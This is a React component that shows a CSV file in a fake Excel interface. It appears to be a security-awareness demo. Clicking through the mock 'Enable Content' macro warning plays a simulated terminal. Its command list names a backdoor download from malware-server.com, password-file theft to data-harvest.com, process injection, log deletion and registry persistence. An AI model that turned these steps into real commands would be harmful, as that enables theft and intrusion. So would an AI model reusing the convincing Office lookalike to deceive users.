import React, { useState, useEffect } from "react";
import Papa from "papaparse";

// Simulated malicious commands that would be executed by the macro
const maliciousCommands = [
  { command: "connect 192.168.1.45 --port 443 --hidden", delay: 500 },
  { command: "download https://malware-server.com/backdoor.exe", delay: 1200 },
  { command: "accessing /Users/Documents/* -r", delay: 800 },
  {
    command: "copy /Users/*/Passwords.txt https://data-harvest.com/collect",
    delay: 1500,
  },
  { command: "inject process.exe --stealth", delay: 700 },
  { command: "install backdoor --hide", delay: 1000 },
  { command: "delete logs/* --no-trace", delay: 600 },
  {
    command:
      "startup reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
    delay: 900,
  },
  { command: "message Success: System compromised", delay: 800 },
];

// Terminal simulator component
const TerminalSimulator = ({ isVisible, onClose }) => {
  const [commandIndex, setCommandIndex] = useState(0);
  const [currentCommand, setCurrentCommand] = useState("");
  const [commandHistory, setCommandHistory] = useState([]);
  const [isComplete, setIsComplete] = useState(false);

  useEffect(() => {
    if (!isVisible) {
      // Reset state when terminal is closed
      setCommandIndex(0);
      setCurrentCommand("");
      setCommandHistory([]);
      setIsComplete(false);
      return;
    }

    let timeout;
    let currentText = "";
    const command = maliciousCommands[commandIndex]?.command || "";

    const typeCommand = (index) => {
      if (index >= command.length) {
        // Command typing finished, add to history after a delay
        timeout = setTimeout(() => {
          setCommandHistory((prev) => [...prev, currentCommand]);
          setCurrentCommand("");

          // Move to next command or complete
          if (commandIndex < maliciousCommands.length - 1) {
            setCommandIndex(commandIndex + 1);
          } else {
            setIsComplete(true);
          }
        }, 500);
        return;
      }

      // Type the next character
      currentText += command[index];
      setCurrentCommand(currentText);

      // Schedule next character
      const randomDelay = Math.random() * 100 + 30; // Random typing speed 30-130ms
      timeout = setTimeout(() => typeCommand(index + 1), randomDelay);
    };

    // Start typing with a delay
    timeout = setTimeout(
      () => typeCommand(0),
      maliciousCommands[commandIndex]?.delay || 500
    );

    return () => {
      if (timeout) {
        clearTimeout(timeout);
      }
    };
  }, [isVisible, commandIndex]);

  if (!isVisible) return null;

  return (
    <div className="fixed top-0 left-0 w-full h-full bg-black bg-opacity-80 flex items-center justify-center z-50">
      <div className="w-3/4 max-w-3xl h-3/4 bg-black rounded-lg border border-gray-700 overflow-hidden flex flex-col shadow-2xl">
        <div className="bg-gray-900 px-4 py-2 flex justify-between items-center">
          <div className="text-white text-sm font-mono">
            Terminal - Remote Connection
          </div>
          <button 
            onClick={onClose} 
            className="text-white hover:text-red-500 transition-colors duration-200"
          >
            ✕
          </button>
        </div>
        <div className="flex-1 p-4 font-mono text-sm overflow-auto text-green-500 bg-black">
          <div className="mb-2">
            Microsoft Windows [Version 10.0.19044.1826]
          </div>
          <div className="mb-4">
            (c) Microsoft Corporation. All rights reserved.
          </div>

          {commandHistory.map((cmd, i) => (
            <div key={i} className="mb-1">
              <span className="text-blue-400">C:\Users\Admin&gt; </span>
              <span className="text-white">{cmd}</span>
              <div className="text-green-400 ml-4">
                {i === 0 && "Connection established. Accessing system..."}
                {i === 1 && "Download complete: backdoor.exe [98.2KB]"}
                {i === 2 && "Found 347 files. Scanning contents..."}
                {i === 3 && "Data extraction complete. Files copied successfully."}
                {i === 4 && "Process injection successful. Gaining system access..."}
                {i === 5 && "Backdoor installed and hidden. Maintaining persistence..."}
                {i === 6 && "Logs deleted. Covering tracks..."}
                {i === 7 && "Startup registry entry added. Ensuring persistence..."}
                {i === 8 && "System compromised. All data is now accessible."}
              </div>
            </div>
          ))}

          {!isComplete && (
            <div>
              <span className="text-blue-400">C:\Users\Admin&gt; </span>
              <span className="text-white">{currentCommand}</span>
              <span className="animate-pulse">▌</span>
            </div>
          )}

          {isComplete && (
            <div className="text-red-500 mt-4 text-lg font-bold">
              System compromised. All data is now accessible.
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

// Excel ribbon tabs
const excelRibbonTabs = [
  "File",
  "Home",
  "Insert",
  "Page Layout",
  "Formulas",
  "Data",
  "Review",
  "View",
  "Help"
];

// Excel ribbon component
const ExcelRibbon = () => (
  <div className="bg-[#e2efda] border-b border-[#b7ddb0] px-4 pt-1 pb-2 flex flex-col">
    <div className="flex gap-4 mb-2">
      {excelRibbonTabs.map((tab) => (
        <div
          key={tab}
          className="px-2 py-1 text-sm font-semibold text-[#217346] hover:bg-[#c6efce] rounded cursor-pointer select-none"
        >
          {tab}
        </div>
      ))}
    </div>
    {/* Home tab controls */}
    <div className="flex gap-8 items-end">
      <div className="flex flex-col gap-1">
        <span className="text-xs text-[#217346] font-semibold">Clipboard</span>
        <div className="flex gap-1">
          <button className="bg-white border border-[#b7ddb0] px-2 py-1 rounded text-xs shadow-sm hover:bg-[#f3f3f3]">
            Paste
          </button>
          <button className="bg-white border border-[#b7ddb0] px-2 py-1 rounded text-xs shadow-sm hover:bg-[#f3f3f3]">
            Cut
          </button>
          <button className="bg-white border border-[#b7ddb0] px-2 py-1 rounded text-xs shadow-sm hover:bg-[#f3f3f3]">
            Copy
          </button>
        </div>
      </div>
      <div className="flex flex-col gap-1">
        <span className="text-xs text-[#217346] font-semibold">Font</span>
        <div className="flex gap-1 items-center">
          <button className="bg-white border border-[#b7ddb0] px-2 py-1 rounded text-xs shadow-sm font-bold hover:bg-[#f3f3f3]">
            B
          </button>
          <button className="bg-white border border-[#b7ddb0] px-2 py-1 rounded text-xs shadow-sm italic hover:bg-[#f3f3f3]">
            I
          </button>
          <button className="bg-white border border-[#b7ddb0] px-2 py-1 rounded text-xs shadow-sm underline hover:bg-[#f3f3f3]">
            U
          </button>
          <select className="ml-2 border border-[#b7ddb0] rounded text-xs px-1 py-1 bg-white hover:bg-[#f3f3f3]">
            <option>11</option>
            <option>12</option>
            <option>14</option>
            <option>16</option>
          </select>
        </div>
      </div>
      <div className="flex flex-col gap-1">
        <span className="text-xs text-[#217346] font-semibold">Alignment</span>
        <div className="flex gap-1">
          <button className="bg-white border border-[#b7ddb0] px-2 py-1 rounded text-xs shadow-sm hover:bg-[#f3f3f3]">
            Left
          </button>
          <button className="bg-white border border-[#b7ddb0] px-2 py-1 rounded text-xs shadow-sm hover:bg-[#f3f3f3]">
            Center
          </button>
          <button className="bg-white border border-[#b7ddb0] px-2 py-1 rounded text-xs shadow-sm hover:bg-[#f3f3f3]">
            Right
          </button>
        </div>
      </div>
      <div className="flex flex-col gap-1">
        <span className="text-xs text-[#217346] font-semibold">Number</span>
        <div className="flex gap-1">
          <button className="bg-white border border-[#b7ddb0] px-2 py-1 rounded text-xs shadow-sm hover:bg-[#f3f3f3]">
            Currency
          </button>
          <button className="bg-white border border-[#b7ddb0] px-2 py-1 rounded text-xs shadow-sm hover:bg-[#f3f3f3]">
            Percent
          </button>
          <button className="bg-white border border-[#b7ddb0] px-2 py-1 rounded text-xs shadow-sm hover:bg-[#f3f3f3]">
            Date
          </button>
        </div>
      </div>
    </div>
  </div>
);

function CsvViewer({ fileUrl }) {
  const [csvData, setCsvData] = useState([]);
  const [headers, setHeaders] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  const [selectedCell, setSelectedCell] = useState(null);
  const [protectedView, setProtectedView] = useState(true);
  const [showMacroWarning, setShowMacroWarning] = useState(false);
  const [showTerminal, setShowTerminal] = useState(false);

  useEffect(() => {
    const fetchData = async () => {
      try {
        const response = await fetch(fileUrl);
        const text = await response.text();
        Papa.parse(text, {
          header: true,
          skipEmptyLines: true,
          complete: (results) => {
            if (results.data.length === 0) {
              setError("File is empty or improperly formatted");
            } else {
              setHeaders(Object.keys(results.data[0] || {}));
              setCsvData(results.data);
            }
            setLoading(false);
          },
          error: (error) => {
            setError(error.message);
            setLoading(false);
          },
        });
      } catch (err) {
        setError(err.message);
        setLoading(false);
      }
    };

    fetchData();
  }, [fileUrl]);

  const handleActivate = () => {
    setProtectedView(false);
    setShowMacroWarning(true);
  };

  const handleEnableMacros = () => {
    const confirmed = window.confirm(
      "SECURITY WARNING\n\n" +
        "This file contains macros that can potentially harm your computer.\n" +
        "If you enable macros, code may execute that could give control of your computer to an attacker.\n\n" +
        "Are you sure you want to enable macros?"
    );

    if (confirmed) {
      setShowMacroWarning(false);
      setShowTerminal(true);
    }
  };

  const handleCloseTerminal = () => {
    setShowTerminal(false);
  };

  if (loading)
    return (
      <div className="flex items-center justify-center h-full bg-white">
        <div className="text-center p-8">
          <div className="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-green-600 mx-auto mb-4"></div>
          <p className="text-gray-600">Loading spreadsheet...</p>
        </div>
      </div>
    );

  if (error)
    return (
      <div className="p-6 bg-red-50 border-l-4 border-red-500 text-red-700 h-full flex items-center justify-center">
        <div className="max-w-md">
          <div className="flex items-center mb-2">
            <span className="material-symbols-outlined mr-2">error</span>
            <h3 className="font-bold">File Error</h3>
          </div>
          <p className="mt-2">{error}</p>
        </div>
      </div>
    );

  // Generate column letters (A, B, C...)
  const columnLetters = Array.from({ length: headers.length }, (_, i) =>
    String.fromCharCode(65 + i)
  );

  // Dummy formula bar state
  const selectedCellRef = selectedCell
    ? `${String.fromCharCode(65 + selectedCell.col)}${selectedCell.row + 1}`
    : "A1";

  return (
    <div className="w-full h-full flex flex-col bg-[#f9fafb] border border-gray-300 font-[Segoe UI],sans-serif">
      {/* Excel-style Toolbar */}


      {/* Excel Ribbon */}
      <ExcelRibbon />

      {/* Excel Protected View Bar */}
      {protectedView && (
        <div className="bg-[#fffbe6] border-b border-[#ffe066] text-[#856404] flex items-center justify-between px-6 py-2 text-sm font-medium">
          <span>
            <span className="font-bold">PROTECTED VIEW</span>: Be careful—files
            from the internet can contain viruses. Unless you need to edit, it's
            safer to stay in Protected View.
          </span>
          <button
            onClick={handleActivate}
            className="ml-4 bg-[#217346] hover:bg-[#145a32] text-white font-semibold px-4 py-1 rounded shadow border border-[#145a32]"
          >
            Enable Editing
          </button>
        </div>
      )}

      {/* Macro Warning Bar */}
      {showMacroWarning && (
        <div className="bg-[#fed8b1] border-b border-[#f0ad4e] text-[#8a6d3b] flex items-center justify-between px-6 py-2 text-sm font-medium">
          <span>
            <span className="font-bold">SECURITY WARNING</span>: Macros have
            been disabled. This workbook contains macros that analyze and
            visualize your data.
          </span>
          <button
            onClick={handleEnableMacros}
            className="ml-4 bg-[#f0ad4e] hover:bg-[#ec971f] text-white font-semibold px-4 py-1 rounded shadow border border-[#eea236]"
          >
            Enable Content
          </button>
        </div>
      )}

      {/* Dummy Formula Bar */}
      <div className="bg-[#f3f3f3] border-b border-[#e0e0e0] flex items-center px-4 py-2 gap-2">
        <span className="bg-white border border-[#b7ddb0] rounded px-2 py-1 text-xs text-[#217346] font-semibold min-w-[40px] text-center">
          {selectedCellRef}
        </span>
        <input
          className="flex-1 border border-[#b7ddb0] rounded px-2 py-1 text-sm bg-white focus:outline-[#217346]"
          value={
            selectedCell
              ? csvData[selectedCell.row][headers[selectedCell.col]] || ""
              : ""
          }
          readOnly
          placeholder="= Formula bar (dummy)"
        />
      </div>

      {/* Spreadsheet Grid */}
      <div className="flex-1 overflow-auto relative">
        <table className="border-collapse w-full text-sm">
          <thead>
            <tr>
              {/* Empty top-left cell */}
              <th className="sticky top-0 left-0 z-20 bg-[#e2efda] border border-[#b7ddb0] w-8 h-8"></th>
              {/* Column headers (A, B, C...) */}
              {columnLetters.map((letter, index) => (
                <th
                  key={index}
                  className="sticky top-0 z-10 bg-[#e2efda] border border-[#b7ddb0] text-xs font-semibold text-[#217346] w-24 h-8 text-center"
                >
                  {letter}
                </th>
              ))}
            </tr>
          </thead>
          <tbody>
            {csvData.map((row, rowIndex) => (
              <tr key={rowIndex}>
                {/* Row number */}
                <td className="sticky left-0 z-10 bg-[#e2efda] border border-[#b7ddb0] text-xs font-semibold text-[#217346] w-8 h-8 text-center">
                  {rowIndex + 1}
                </td>
                {/* Data cells */}
                {headers.map((header, colIndex) => (
                  <td
                    key={colIndex}
                    className={`border border-[#b7ddb0] p-1 text-xs transition-colors duration-75 ${
                      selectedCell?.row === rowIndex &&
                      selectedCell?.col === colIndex
                        ? "bg-[#c6efce] border-[#217346]"
                        : "bg-white"
                    }`}
                    onClick={() =>
                      setSelectedCell({ row: rowIndex, col: colIndex })
                    }
                  >
                    <div className="w-full h-full overflow-hidden truncate px-1">
                      {row[header]}
                    </div>
                  </td>
                ))}
              </tr>
            ))}
          </tbody>
        </table>
      </div>

      {/* Status Bar */}
      <div className="bg-[#e2efda] border-t border-[#b7ddb0] px-3 py-1 text-xs text-[#217346] flex justify-between">
        <div>Ready</div>
        <div className="flex space-x-4">
          <span>Records: {csvData.length}</span>
          <span>CSV</span>
        </div>
      </div>

      {/* Dummy Sheet Tabs Bar */}
      <div className="bg-[#f3f3f3] border-t border-[#e0e0e0] px-2 py-1 flex items-center gap-2">
        <div className="bg-white border border-[#b7ddb0] rounded-t px-4 py-1 text-[#217346] font-semibold shadow-sm">
          Sheet1
        </div>
        <div className="bg-[#e2efda] border border-[#b7ddb0] rounded-t px-4 py-1 text-[#217346] font-semibold">
          Sheet2
        </div>
        <button className="ml-2 bg-[#e2efda] border border-[#b7ddb0] rounded-full w-7 h-7 flex items-center justify-center text-[#217346] text-lg font-bold">
          +
        </button>
      </div>

      {/* Terminal Simulator */}
      <TerminalSimulator
        isVisible={showTerminal}
        onClose={handleCloseTerminal}
      />
    </div>
  );
}

export default CsvViewer;
